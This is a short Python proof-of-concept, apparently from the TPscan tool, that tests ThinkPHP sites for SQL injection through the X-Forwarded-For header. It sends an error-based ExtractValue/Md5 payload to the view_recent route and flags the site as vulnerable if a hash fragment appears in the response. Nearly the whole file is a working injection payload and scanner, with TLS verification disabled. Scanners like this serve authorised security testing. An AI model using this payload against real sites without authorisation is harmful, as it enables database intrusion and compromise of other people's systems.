#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3
urllib3.disable_warnings()

def thinkphp_view_recent_xff_sqli_verify(url):
    pocdict = {
        "vulnname":"thinkphp_view_recent_xff_sqli",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":"",
    }
    headers = {
        "User-Agent" : 'TPscan',
        "X-Forwarded-For" : "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#"
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=/home/article/view_recent/name/1')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['proof'] = '56540676a129760a'
            pocdict['response'] = req.text
            print(pocdict)

    except:
        pass